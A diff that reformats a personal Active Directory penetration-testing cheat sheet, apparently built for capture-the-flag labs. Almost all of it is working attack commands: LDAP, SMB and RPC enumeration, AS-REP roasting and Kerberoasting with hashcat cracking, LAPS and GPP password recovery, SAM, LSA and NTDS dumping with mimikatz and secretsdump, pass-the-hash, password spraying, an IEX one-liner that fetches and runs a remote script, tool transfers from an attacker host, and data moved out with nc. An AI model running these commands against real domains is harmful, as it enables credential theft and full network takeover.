@@ -1,26 +1,27 @@
+=================================== 
 # PORTS
 
-- `53 Simple DNS Plus - DNS is usually UDP, but sometimes TCP is needed for large packets`
-- `9389 MC-NMF .Net Message Framing - Active Directory Management Gateway Service`
+53 Simple DNS Plus - DNS is usually UDP, but sometimes TCP is needed for large packets
+9389 MC-NMF .Net Message Framing - Active Directory Management Gateway Service
 
-- `389 LDAP - For Queries to the Domain Controller`
-- `636 tcpwrapped - LDAPS for TLS/SSL -  Port to use for LDAP querying using SSL`
-- `3269 tcpwrapped - Querying LDAP using Global Catalog using SSL`
-- `3268 MS AD LDAP - For queries targeted at the Global Catalog.`
+389 LDAP - For Queries to the Domain Controller
+636 tcpwrapped - LDAPS for TLS/SSL -  Port to use for LDAP querying using SSL
+3269 tcpwrapped - Querying LDAP using Global Catalog using SSL
+3268 MS AD LDAP - For queries targeted at the Global Catalog.
 
-- `88 Kerberos-sec - Authentication protocol (88 and 464 are Standard Kerberos)`
- - `464 kpasswd5 -  Kerberos Password Change - for changing/setting passwords against AD`
+88 Kerberos-sec - Authentication protocol (88 and 464 are Standard Kerberos)
+464 kpasswd5 -  Kerberos Password Change - for changing/setting passwords against AD
 
-- `135 RPC - Remote Procedure Call Endpoint Mapper service. Enables systems find services/ports`
-- `593 ncacn_http - RPC over HTTP - Used for Messaging Service`
-- `139 Netbios - Network Basic Input Output System name resolution to serve Windows File and Printer Sharing.`
-- `445 MS DS  - Server Message Blocks (SMB) to serve Windows File and Printer  Sharing.`
+135 RPC - Remote Procedure Call Endpoint Mapper service. Enables systems find services/ports
+593 ncacn_http - RPC over HTTP - Used for Messaging Service
+139 Netbios - Network Basic Input Output System name resolution to serve Windows File and Printer Sharing.
+445 MS DS  - Server Message Blocks (SMB) to serve Windows File and Printer  Sharing.
 
-- `3389 Remote Desktop`
-- `5985 HTTP SSDP/UPnP - WinRM (remote desktop)`
+3389 Remote Desktop
+5985 HTTP SSDP/UPnP - WinRM (remote desktop)
 
 
---- 
+=================================== 
 # Hacktricks
 
 - https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet 
@@ -31,37 +32,38 @@
 - LDAP 389,636,3268,3269 https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap
 
 
----
+===================================
 Update
-`sudo vim /etc/hosts`
+sudo vim /etc/hosts
+
 
 DNS
-```bash
+bash
 nmap -sC -sV -p 53,389,3268 10.129.97.56
 dnsrecon -d 10.129.97.56 -r 10.129.97.56/24 
-```
+
 
 Host
-```bash
+
 host -t ns mike.com  
 dnsenum mike.com --dnsserver dns.mike.com -f ~/tools/wordlists/dns.txt 
-```
+
 
 Resolve 
-```bash
+
 dig  @10.129.97.56 mike.com
 dig  @10.129.97.56 forest.mike.com
-```
+
 
 Zone Transfer
-```bash
+
 dig axfr  @10.129.97.56 mike.com
 dnsrecon -d mike.com -t axfr  
 nmap --script=dns-zone-transfer -p 53 ns2.mike.com 
-```
 
 
----
+
+===================================
 ### AD Entry Scenario - 1
 
 - SMB open-share
@@ -69,7 +71,7 @@ nmap --script=dns-zone-transfer -p 53 ns2.mike.com
 - SMB Authenticated
 - Kerberoast with SVC account with creds.
 
-```bash
+
 smbmap -H 10.129.97.56 -u '' -p '' 
 smbclient -L //10.129.97.56  
 smbclient //10.129.97.56/share 
@@ -78,10 +80,10 @@ get Groups.xml
 gpp-decrypt abczyz  = paxxword
 smbclient //10.129.97.56/secrets -U mike.com\\SVC%paxxword
 GetUserSPNs.py -request mike.com/SVC
-```
 
 
----
+
+===================================
 ### AD Entry Scenario - 2 
 
 - Query LDAP w/o creds.
@@ -90,16 +92,16 @@ GetUserSPNs.py -request mike.com/SVC
 - Found 'LAPS' Directory, so try LAPS pw-search in LDAP
 - Connect with evil-winrm
 
-```bash
+
 nmap -n -sV --script "ldap* and not brute" 10.129.97.56
 ldapsearch -v -x -b "DC=mike,DC=com" -H "ldap://10.129.97.56" "(objectclass=*)"
 dir "C:\Program Files\LAPS"
 ldapsearch -v -x -D bob@mike.com -w paxx -b "DC=mike,DC=com" -H "ldap://10.129.97.56" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd 
 evil-winrm -i 10.129.97.56 -u administrator -p paxx
 pxexec.py administrator@mike.com
-```
 
----
+
+===================================
 ### AD Entry Scenario -3 
 
 - Get in with Upload Vuln
@@ -109,7 +111,7 @@ pxexec.py administrator@mike.com
 - Re-use hash/creds on next-level box
 - Find domain users and pivot till you get DA
 
-```bash
+
 cd C:\Users\Administrator\Downloads\
 reg.exe save hklm\sam samx 
 reg.exe save hklm\security securityx 
@@ -126,14 +128,14 @@ lsadump::secrets
 sekurlsa::logonpasswords
 
 psexec administrator@10.129.97.56 -hashes aadc123:abc123
-```
 
 
----
+
+===================================
 # Hunting with NO creds
 
 RPC
-```bash
+
 nmap -p 135 --script=msrpc-enum 10.129.97.56 
 rpcclient -U '' -N 10.129.97.56
 $> enumdomusers          =Users - We can crack with these!!!
@@ -141,10 +143,10 @@ $> enumdomgroups         =Groups
 $> querygroup 0x200      =Domain Admins      
 $> querygroupmem 0x200   =Found rid:[0x1f4] 
 $> queryuser 0x1f4       =Administrator 
-```
+
 
 SMB
-```bash
+
 sudo nmap -p 445 -v --script=smb-enum-shares,smb-enum-users 10.129.97.56
 sudo nmap -p 139,445 -v --script=smb-vuln* 10.129.97.56 
 enum4linux -A 10.129.97.56
@@ -157,32 +159,31 @@ smbclient -L -N //10.129.97.56
 smbclient -L //10.129.97.56  
 smbclient -L //10.129.97.56/ -U "guest"
 smbclient //10.129.97.56/share 
-```
 
-NFS
-`showmount -e 10.129.97.56`
+
+NFS showmount -e 10.129.97.56
 
 LDAP
-```bash
+
 nmap -n -sV --script "ldap* and not brute" 10.129.97.56
 ldapsearch -v -x -b "DC=mike,DC=com" -H "ldap://10.129.97.56" "(objectclass=*)"
 impacket-lookupsid mike.com/guest@10.129.97.56
-```
+
 
 Brute from Userlist
-`crackmapexec smb 10.129.97.56 -d mike.com -u users.txt -p pass.txt `
+crackmapexec smb 10.129.97.56 -d mike.com -u users.txt -p pass.txt
 
 
----
+===================================
 LDAP Domain Name
-`nmap -n -sV --script "ldap* and not brute" 10.129.97.56`
+nmap -n -sV --script "ldap* and not brute" 10.129.97.56
 
 LDAP User Search
 Might find an interesting Comment. No password needed. 
-`ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://10.129.97.56" "(objectclass=*)" | grep -i -e 'pass\|name\|desc' `
+ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://10.129.97.56" "(objectclass=*)" | grep -i -e 'pass\|name\|desc'
 
 LDAP Other Searches
-```bash
+
 ldapsearch -s base -x -H "ldap://10.129.97.56" | grep namingContexts
 ldapsearch -x -H "ldap://10.129.97.56" -b "DC=mike,DC=com"
 ldapsearch -x -H "ldap://10.129.97.56" -D '' -w '' -b "DC=mike,DC=com" |  grep sAMAccountName: 
@@ -191,54 +192,54 @@ ldapsearch -v -x -b "DC=mike,DC=com" -H "ldap://10.129.97.56" "(objectclass=*)" 
 ldapsearch -x -H "ldap://10.129.97.56" -D "cn=admin,dc=mike,dc=com" -s sub "cn=*"
 ldapdomaindump -u 'htb.local\bob' -p paxxword 10.129.97.56 -o ~/lab/ldap/ 
 firefox ~/lab/ldap/domain_users.html
-```
+
 
 LDAP Query with Creds 
 Might find the 'LAPS' Admin password 
-```bash
+
 dir "c:\Program Files"  ..LAPS
 ldapsearch -v -x -D bob@mike.com -w paxxword -b "DC=mike,DC=com" -H "ldap://10.129.97.56" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd 
-```
 
----
+
+===================================
 LDAP Beautiful Results to HTML
   
-```bash
+
 ldapdomaindump -u 'htb.local\bob' -p paxxword 10.129.97.56 -o ~/lab/ldap/ 
 firefox ~/lab/ldap/domain_users.html  
 firefox ~/lab/ldap/domain_computers.html 
-```
 
 
----
+
+===================================
 # Hunt for Usernames
 
 Find usernames in Samba Docs
-```bash
+
 smbclient -N -L //10.129.97.56/
 crackmapexec smb 10.129.97.56 -u guest -p "" --shares
 crackmapexec smb 10.129.97.56 -u guest -p "" --shares -M spider_plus
 smbclient -N  //10.129.97.56/shared
 get docwithusers.txt
-```
+
 
 Find usernames from RPC
-```bash
+
 rpcclient -U "" 10.129.97.56
 r> enumdomusers
-```
+
 
 Find users via LDAP (anonymous)
-- `ldapsearch -x -h 10.129.97.56 -b base namingcontext`
+ldapsearch -x -h 10.129.97.56 -b base namingcontext
 
 Find Domain users on box
-- `lookupsid.py -no-pass mike.com`
-- `lookupsid.py mike.com/guest@10.129.97.56 > domusers.txt`
+lookupsid.py -no-pass mike.com
+lookupsid.py mike.com/guest@10.129.97.56 > domusers.txt
 
 Remove the domain prefix
-- `cat domusers.txt | grep -i user | awk -F \\ '{print $2}'| awk '{print $1}'`
+cat domusers.txt | grep -i user | awk -F \\ '{print $2}'| awk '{print $1}'
 
-- `vim allusers.txt`
+vim allusers.txt
 Johnny Leet
 Tony Skids
 Jack Goldenhand
@@ -248,35 +249,35 @@ Guest          ..add manually
 
 Mangle More Users
 https://github.com/PinkDraconian/CTF-bash-tools
-- `ctf-wordlist-names allusers.txt`
+ctf-wordlist-names allusers.txt
 
----
+===================================
 Check userlist for Valid AD Users
-```bash
-kerbrute userenum -d mike.com --dc 10.129.97.56 formatted_name_wordlist.txt
-```
 
---- 
+kerbrute userenum -d mike.com --dc 10.129.97.56 formatted_name_wordlist.txt
+
+
+=================================== 
 Found Users (with no passwords)
 
 AS-REP Roast 
 Crack Users that dont require creds to request TGT from the KDC (likely a Service Acct) 
 Requires port 88 (kerberos) and usernames to try AS-REP Roasting 
 
-```bash
+
 impacket-GetNPUsers mike.com/ -no-pass -usersfile users.txt
 for user in $(cat users); do GetNPUsers.py -no-pass -dc-ip 10.129.97.56 mike.com/${user} | grep -v Impacket; done 
 
 hashcat -m 18200 hash.kerb $rockyou --force 
 john --wordlist=$rockyou asrephash.txt
 evil-winrm -i 10.10.10.161 -u svc-admin -p paxxword
-```
 
 
----
+
+===================================
 # TOOLS
 
-```bash
+
 cd ~\tools\AD\
 python3 /usr/share/doc/python3-impacket/examples/smbserver.py share `pwd` -smb2support -username mike -password paxx  
 net use \\192.168.49.124\share /USER:mike helps
@@ -292,59 +293,59 @@ copy PowerView.ps1 \\192.168.49.124\share\
 
 python3 -m http.server 80
 powershell wget 192.168.49.124/SharpHound.exe -O SharpHound.exe
-```
 
 
----
+
+===================================
 Quick-Roast (requires creds)
 Need credentials for a domain user/service 
 
-```bash
+
 echo "10.129.97.56 mike.com" >> /etc/hosts  
 GetUserSPNs.py -request domain/SVC_TGS  
 GetUserSPNs.py -request domain/bob:pass -dc-ip 10.129.97.56 -outputfile kbroast.txt 
-```
 
 
----
+
+===================================
 GMSA User Crack 
-- `gMSADumper.py -u 'mike' -p paxxword -d mydom.htb     ..remote pull, with user/creds`
-- `GMSAPasswordReader.exe --accountname svc_apache      ..target connected acct able to read gmsa`
+gMSADumper.py -u 'mike' -p paxxword -d mydom.htb     ..remote pull, with user/creds
+GMSAPasswordReader.exe --accountname svc_apache      ..target connected acct able to read gmsa
 
----
+===================================
 Silver Ticket 
-- `getST.py -spn www/dc.mike.com -impersonate Administrator domain/svc_gmsa$   `
+getST.py -spn www/dc.mike.com -impersonate Administrator domain/svc_gmsa$
 
  
----
+===================================
 ASREP Roastable Users (no creds needed)
 
-```bash
+
 GetNPUsers.py domain/bob
 GetNPUsers.py domain/ -no-pass -usersfile userlist.txt  
 GetNPUsers.py domain/ -usersfile mylist.txt -format john -outputfile asrep.txt -dc-ip 10.129.97.56 -debug 
 GetNPUsers.py domain/bob:pass -request -format john -outputfile asrep.txt
 john --wordlist=$rockyou --format=krb5asrep asrep.txt
-```
 
 
----  
+
+===================================  
 Kerberoast - Domain Creds Required 
   
 Get a list of service-usernames which are associated with normal user accounts 
 Also grabs Tickets for cracking. 
 Example: We have Creds for "active.htb/SVC_TGS" - We can find "Administrator" 
   
-```bash
+
 GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out 
 cat GetUserSPNs.out  
 $krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$7028f37... 
 hashcat -m 13100 -a 0 GetUserSPNs.out $rockyou --force                                        
 psexec.py active.htb/administrator@10.10.10.100 
-```
 
 
----
+
+===================================
 # Invoke-Kerberoast.ps1  - Hailmary
 
 Requires an admin/login on an AD box (you used mimikatz, right?) 
@@ -353,7 +354,7 @@ Can enumerate all service principal names in the domain, request service tickets
 Export them in a format ready for cracking in both John the Ripper and Hashcat
 Completely eliminating the need for Mimikatz in this attack. 
 
-```bash
+
 psexec administrator@10.129.97.56 -hashes aad3b4356:aad3b435
 python3 /usr/share/doc/python3-impacket/examples/smbserver.py share `pwd` -smb2support -username mike -password paxx  
 copy \\192.168.119.154\share\Invoke-Kerberoast.ps1  
@@ -362,52 +363,52 @@ Import-Module .\Invoke-Kerberoast.ps1
 Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII khash0.txt  
 copy khash0.txt \\192.168.119.154\share\  
 hashcat -m 13100 -a 0 khash0.txt $rockyou --force    
-```
+
 
 Faster: 
-- `powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1') ; Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-Hash0.txt"  `
+powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1') ; Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-Hash0.txt"
 
 
----
+===================================
 Crack
 
-- `hashcat --example-hashes | less  `
-- `hashcat --example-hashes | grep kerb -B2 -A2  `
-- `hashcat -m 18200 hash.txt $rockyou  `
-- `hashcat -m 13100 -a 0 khash0.txt $rockyou --force    `
+hashcat --example-hashes | less
+hashcat --example-hashes | grep kerb -B2 -A2
+hashcat -m 18200 hash.txt $rockyou
+hashcat -m 13100 -a 0 khash0.txt $rockyou --force
 
 
----
+===================================
 # Got Creds
 
 Lookup Usernnames
-- `lookupsid.py mike.com/bob:"paxxword1\!"@10.129.97.56`
+lookupsid.py mike.com/bob:"paxxword1\!"@10.129.97.56
 
 Check Samba Again
-- `crackmapexec smb 10.129.97.56 -u bob -p "paxx" -M spider_plus`
+crackmapexec smb 10.129.97.56 -u bob -p "paxx" -M spider_plus
 
 Cred Test
-```bash
+
 crackmapexec smb 10.129.97.56 -u jimmy -p "hacked"
 psexec mike.com/jimmy@10.129.97.56
 wmiexec mike.com/jimmy@10.129.97.56
-```
+
 
 Spray
-- `kerbrute passwordspray --dc 10.129.97.56 -d mydomain users.txt 'Paxxword'`
-- `crackmapexec smb 10.129.97.56 -u bob -p Paxxword --shares    `
+kerbrute passwordspray --dc 10.129.97.56 -d mydomain users.txt 'Paxxword'
+crackmapexec smb 10.129.97.56 -u bob -p Paxxword --shares
 
 All Hashes
-- `secretsdump mike.com/dcbob@10.129.97.56`
+secretsdump mike.com/dcbob@10.129.97.56
 
 Finally
-- `wmiexec mike.com/administrator@10.129.97.56 -hashes abc123:abc123`
+wmiexec mike.com/administrator@10.129.97.56 -hashes abc123:abc123
 
 
---- 
+=================================== 
 Bloodhound 
 
-```bash
+
 cd C:\Windows\Temp  
 copy \\10.10.16.135\share\SharpHound.exe  
 copy \\10.10.16.135\share\SharpHound.ps1 
@@ -424,24 +425,24 @@ nc -nvlp 9999 < 123456_BloodHound.zip
 nc 10.129.97.56 9999 > Sharphound.zip
 sudo neo4j start
 bloodhound
-```
+
 
 Remote Bloodhound (needs creds)
-- `bloodhound.py -c All,LoggedOn -u "bob" -p "paxx" -d mike.com -ns 10.129.97.56`
+bloodhound.py -c All,LoggedOn -u "bob" -p "paxx" -d mike.com -ns 10.129.97.56
 
 
----
+===================================
 Mimikatz/PTH/GetDC 
 
-- `sekurlsa::pth /user:bob /domain:corp.com /ntlm:abc123xyz /run:PowerShell.exe   `
-- `PS> net user \\mydc `
-- `PS> klist  `
-- `PS> PsExec.exe \\mydc cmd.exe  `
+sekurlsa::pth /user:bob /domain:corp.com /ntlm:abc123xyz /run:PowerShell.exe
+PS> net user \\mydc
+PS> klist
+PS> PsExec.exe \\mydc cmd.exe
   
----
+===================================
 # Port 88 Internal Only - Chisel and Roast
 
-```bash
+
 netstat -ap tcp
 iwr -uri http://10.10.16.135/chisel_windows_amd64.exe -outfile chisel.exe 
 PS C:\windows\temp> .\chisel.exe client 10.10.16.135:8008 R:88:127.0.0.1:88 R:389:localhost:389 
@@ -449,15 +450,15 @@ kali> /opt/chisel/chisel server -p 8008 --reverse
 kali> GetUserSPNs.py -request -dc-ip 127.0.0.1 mike.com/bob -save -outputfile GetUserSPNs.out                                                                                                                                              
 kali> GetUserSPNs.py -request -dc-ip 127.0.0.1 mike.com/bob
 Got the Kerberoast Hash 
-```
+
  
----
+===================================
 # Domain Enums with PowerView 
 
-```bash
+
 powershell.exe -nop -exec bypass
 Import-Module .\PowerView.ps1  
-```
+
 
 ### Roast 
 Invoke-Sharefinder 
@@ -496,27 +497,28 @@ Get-NetDomainController
 Get-NetGPO 
   
   
----  
+===================================  
 # AD/Domain  
   
 ### Powerview  
-```bash
+
 powershell.exe -nop -exec bypass  
 Import-Module .\PowerView.ps1  
 Get-NetLoggedon -ComputerName client251   
 Get-NetSession -ComputerName dc01   
 Invoke-Kerberoast  
 Invoke-BypassUAC  
-```
 
-  
----  
-Consider mxsam mxwinenum
 
----
+===================================
 # PWN
 
-- `evil-winrm -i 10.129.97.56 -u administrator -p paxxword`
-- `secretsdump -system SYSTEM -ntds ntds.dit -hashes lmhash:nthash LOCAL -outputfile ntlm-extract `
-- `secretsdump.py -just-dc mrlky:Football#7@10.10.10.103    ..if 88 isnt exposed`
-- `secretsdump mike.com/administrator@10.129.97.56         ..Remote`
+evil-winrm -i 10.129.97.56 -u administrator -p paxxword
+secretsdump -system SYSTEM -ntds ntds.dit -hashes lmhash:nthash LOCAL -outputfile ntlm-extract
+secretsdump.py -just-dc mrlky:Football#7@10.10.10.103    ..if 88 isnt exposed
+secretsdump mike.com/administrator@10.129.97.56         ..Remote
+
+  
+===================================  
+Consider mxsam mxwinenum
+
